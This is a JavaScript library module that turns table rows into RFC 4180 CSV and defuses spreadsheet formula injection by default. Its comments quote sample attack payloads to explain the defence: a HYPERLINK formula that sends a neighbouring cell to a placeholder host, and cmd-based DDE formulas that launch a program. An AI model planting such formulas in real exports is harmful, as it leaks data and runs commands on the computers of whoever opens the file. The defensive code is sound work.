/**
 * egl-utils-js — CSV from a derived view (spec 06 §2 item F96).
 *
 * RFC 4180, and pure: no dependency, no DOM, no `Blob`, no download. A string
 * comes out, and what the caller does with it — a clipboard write (F97), a
 * `Blob`, a POST to their own service — is theirs. That split is what keeps this
 * on the Node-safe `/table` entry, where a server render can build the same file
 * for the same rows (NFR-29).
 *
 * **The formula-injection case is handled by default, and it is the reason this
 * file has a security note at all.** A CSV is not an inert document: every
 * mainstream spreadsheet evaluates a cell whose text begins `=`, `+`, `-` or `@`,
 * so a field reading `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the row
 * next to it the moment someone opens the export, and `=cmd|'/C calc'!A0`
 * historically did worse. The data is usually not the exporter's — it is whatever
 * users typed into the application — so a library that emitted it verbatim and
 * said nothing would have shipped the vulnerability on the caller's behalf.
 *
 * So dangerous leading characters are neutralized with a `'` prefix, **except
 * where the whole field is a number**: `-5` is not a formula, and prefixing it
 * would corrupt every numeric column to buy nothing. That exception is the
 * difference between a mitigation people keep and one they switch off.
 *
 * **Excel stays out of core.** XLSX needs a runtime dependency, and NFR-06 is not
 * negotiable for it. This function is the extension point: derived rows in, text
 * out, and a caller who needs a workbook hands those rows to a writer of their
 * choosing.
 *
 * @module egl-utils-js/table
 */

import { assertNoUnknownOptions } from './option-keys.js';

/**
 * Leading characters a spreadsheet may read as the start of an expression.
 *
 * `\t` and `\r` are in the set because a leading one of either can shift a field
 * into the next cell or row as some parsers see it, which puts the character
 * after it in the leading position — the OWASP list, and the reason this is not
 * simply `=+-@`.
 */
const RISKY_LEADING = new Set(['=', '+', '-', '@', '\t', '\r']);

/** RFC 4180's line terminator, and the default. */
const CRLF = '\r\n';

/**
 * @typedef {object} TableCsvColumn
 * @property {string} key - The row property this column reads, and the fallback
 *   header. The same `key` the pipeline and `bsTable` already use.
 * @property {string} [header] - The column heading. Falls back to `label` when
 *   that is a string, then to `key` — so the column array a table is already
 *   rendering can be passed straight in, and a `label` that is a **node** is
 *   skipped rather than stringified into `[object Object]`.
 * @property {unknown} [label] - Accepted and read only when it is a string, for
 *   exactly that reason.
 * @property {(row: any) => unknown} [getValue] - The value to export, when it is
 *   not `row[key]`. The same option the pipeline and `bsTable` read, so one
 *   column definition serves derivation, rendering and export.
 * @property {(value: unknown, row: any) => unknown} [text] - Export formatting.
 *   Deliberately **not** `format`: a table's `format` returns `Content`, which
 *   may be a DOM node, and a node has no text form. Reading it anyway would make
 *   the file disagree with the screen in ways nobody can see, so the export asks
 *   for its own formatter and defaults to the raw value.
 */

/**
 * @typedef {object} TableCsvOptions
 * @property {readonly TableCsvColumn[]} columns - Which columns, in which order.
 *   Required: a CSV with no columns is an empty file, and guessing them from the
 *   first row would make the export depend on which row happened to be first.
 * @property {boolean} [header=true] - Emit the header row.
 * @property {string} [delimiter=','] - One character, and not `"`, `\r` or `\n` —
 *   those three have meaning in the grammar and cannot also separate fields.
 *   `'\t'` is the spreadsheet-paste format F97 mentions.
 * @property {string} [newline='\r\n'] - RFC 4180 says CRLF and that is the
 *   default. An option rather than something a caller fixes afterwards, because
 *   `text.replace(/\r\n/g, '\n')` would also rewrite the CRLFs **inside** quoted
 *   fields — corrupting the data while appearing to reformat the file.
 * @property {boolean} [neutralizeFormulas=true] - Prefix a field whose text could
 *   be read as a formula with `'`. Defeatable, deliberately, for a caller who
 *   knows their consumer is not a spreadsheet — and switching it off is one
 *   greppable word rather than a silent default.
 * @property {(value: unknown, column: TableCsvColumn, row: any) => string} [format] - How
 *   a value becomes text, for every column without its own `text`. Defaults to
 *   `''` for nullish and `String(value)` otherwise, so an empty cell is empty
 *   rather than the word "null".
 */

/**
 * The default value → text rule.
 *
 * Nullish becomes empty, not `'null'`: a CSV cell is untyped, and the whole point
 * of an empty field is that it says nothing.
 *
 * @param {unknown} value
 * @returns {string}
 */
function defaultFormat(value) {
  return value === null || value === undefined ? '' : String(value);
}

/**
 * Whether a field's text is entirely a number, and therefore cannot be a formula.
 *
 * This is the exception that makes the mitigation liveable. `-5`, `+3.5` and
 * `-1e6` all start with a risky character and all are data; neutralizing them
 * would corrupt every numeric column in every export, which is how a security
 * default gets switched off wholesale. `-2+3+cmd|' /C calc'!A0` is not a number,
 * and neither is `- 5`.
 *
 * @param {string} text
 * @returns {boolean}
 */
function isNumeric(text) {
  return text.trim() !== '' && Number.isFinite(Number(text));
}

/**
 * @param {string} text
 * @param {boolean} neutralize
 * @returns {string}
 */
function guard(text, neutralize) {
  if (!neutralize || text === '') return text;
  if (!RISKY_LEADING.has(text[0])) return text;
  if (isNumeric(text)) return text;
  return `'${text}`;
}

/**
 * Quote a field, and only where the grammar requires it.
 *
 * RFC 4180 quotes a field containing the delimiter, a quote, CR or LF, and
 * doubles the quotes inside. Quoting everything would also be valid and is what
 * most naive writers do; quoting only where required keeps the file readable and
 * diffable, which is what an export is usually for.
 *
 * A leading or trailing space is quoted too. It is not required by the grammar,
 * and it is the one case where a lenient parser and a strict one disagree about
 * the value.
 *
 * @param {string} text
 * @param {string} delimiter
 * @returns {string}
 */
function quote(text, delimiter) {
  const mustQuote =
    text.includes(delimiter) ||
    text.includes('"') ||
    text.includes('\n') ||
    text.includes('\r') ||
    text !== text.trim();
  return mustQuote ? `"${text.replaceAll('"', '""')}"` : text;
}

/**
 * Serialize rows to RFC 4180 CSV (F96).
 *
 * Takes the rows it is given — `view().rows` for the current page, the whole
 * source for everything, or the selection for what the user ticked — and the
 * column definitions already in hand.
 *
 * @example
 * tableCsv(table.view().rows, { columns });
 * // 'id,name\r\n7,ada\r\n9,bob\r\n'
 *
 * @example
 * // Just what the user selected, which is a filter and not an option:
 * const picked = rows.filter((row) => selection.isSelected(row));
 * tableCsv(picked, { columns });
 *
 * @example
 * // Tab-separated, for pasting into a spreadsheet (F97):
 * copyToClipboard(tableCsv(rows, { columns, delimiter: '\t' }));
 *
 * @example
 * // The injection default, and what it does:
 * tableCsv([{ note: '=1+1' }, { note: -5 }], { columns: [{ key: 'note' }] });
 * // "note\r\n'=1+1\r\n-5\r\n"  — the formula is defused, the number is untouched
 *
 * @param {readonly any[]} rows - The rows to export, in the order they should
 *   appear. Deriving, filtering and sorting happened before this call; a
 *   serializer that re-ordered its input would be answering a question nobody
 *   asked.
 * @param {TableCsvOptions} options
 * @returns {string} The whole file, terminated with `newline`. A trailing
 *   terminator is what RFC 4180 permits and what every parser accepts, and it
 *   makes appending another block a concatenation rather than a special case.
 * @throws {TypeError} If `rows` is not an array, if `columns` is missing or empty,
 *   if a column has no string `key`, if `delimiter` is not a single legal
 *   character, if `newline` is neither `'\r\n'` nor `'\n'`, or on an unknown
 *   option key (ADR-0047).
 */
export function tableCsv(rows, options) {
  const api = 'tableCsv';
  if (!Array.isArray(rows)) {
    throw new TypeError(`${api}: rows must be an array`);
  }
  if (options === null || typeof options !== 'object') {
    throw new TypeError(`${api}: options must be an object with columns`);
  }
  const {
    columns,
    header = true,
    delimiter = ',',
    newline = CRLF,
    neutralizeFormulas = true,
    format = defaultFormat,
    ...unknown
  } = options;
  assertNoUnknownOptions(unknown, api);

  if (!Array.isArray(columns) || columns.length === 0) {
    throw new TypeError(`${api}: options.columns must be a non-empty array`);
  }
  if (typeof delimiter !== 'string' || delimiter.length !== 1) {
    throw new TypeError(`${api}: options.delimiter must be a single character`);
  }
  if (delimiter === '"' || delimiter === '\r' || delimiter === '\n') {
    throw new TypeError(
      `${api}: options.delimiter cannot be a quote or a line break — those already have a meaning in the grammar`,
    );
  }
  if (newline !== CRLF && newline !== '\n') {
    throw new TypeError(`${api}: options.newline must be '\\r\\n' or '\\n'`);
  }
  if (typeof header !== 'boolean') {
    throw new TypeError(`${api}: options.header must be a boolean`);
  }
  if (typeof neutralizeFormulas !== 'boolean') {
    throw new TypeError(`${api}: options.neutralizeFormulas must be a boolean`);
  }
  if (typeof format !== 'function') {
    throw new TypeError(`${api}: options.format must be a function`);
  }
  for (const [index, column] of columns.entries()) {
    if (column === null || typeof column !== 'object') {
      throw new TypeError(`${api}: options.columns[${index}] must be an object`);
    }
    if (typeof column.key !== 'string' || column.key === '') {
      throw new TypeError(`${api}: options.columns[${index}].key must be a non-empty string`);
    }
    for (const fn of ['getValue', 'text']) {
      if (column[fn] !== undefined && typeof column[fn] !== 'function') {
        throw new TypeError(`${api}: options.columns[${index}].${fn} must be a function`);
      }
    }
  }

  /** @param {string} text @returns {string} */
  const field = (text) => quote(guard(text, neutralizeFormulas), delimiter);

  const lines = [];
  if (header) {
    lines.push(
      columns
        .map((column) =>
          field(column.header ?? (typeof column.label === 'string' ? column.label : column.key)),
        )
        .join(delimiter),
    );
  }

  for (const row of rows) {
    lines.push(
      columns
        .map((column) => {
          const raw =
            column.getValue === undefined
              ? /** @type {Record<string, unknown>} */ (row)?.[column.key]
              : column.getValue(row);
          const text = column.text === undefined ? format(raw, column, row) : column.text(raw, row);
          // A `text`/`format` returning a non-string is coerced here rather than
          // trusted: the whole file is text, and a number handed back from a
          // formatter is a normal thing to do.
          return field(typeof text === 'string' ? text : defaultFormat(text));
        })
        .join(delimiter),
    );
  }

  return lines.length === 0 ? '' : `${lines.join(newline)}${newline}`;
}
